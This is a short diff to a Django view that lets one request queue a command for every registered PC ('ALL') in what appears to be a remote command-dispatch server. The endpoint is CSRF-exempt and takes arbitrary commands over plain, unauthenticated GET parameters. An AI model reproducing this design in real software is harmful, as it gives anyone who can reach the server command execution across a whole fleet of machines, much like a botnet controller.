@@ -131,13 +131,19 @@ def report_pc(request):
 # ==========================
 @csrf_exempt
 def set_command(request):
+
     pc = request.GET.get("pc")
     cmd = request.GET.get("cmd")
 
-    commands[pc] = cmd
+    # 🔥 BROADCAST MODE
+    if pc == "ALL":
+        all_pcs = PC.objects.all()
+        for p in all_pcs:
+            commands[p.name] = cmd
+    else:
+        commands[pc] = cmd
 
     return JsonResponse({"status": "ok"})
-
 
 def get_command(request):
     pc = request.GET.get("pc")
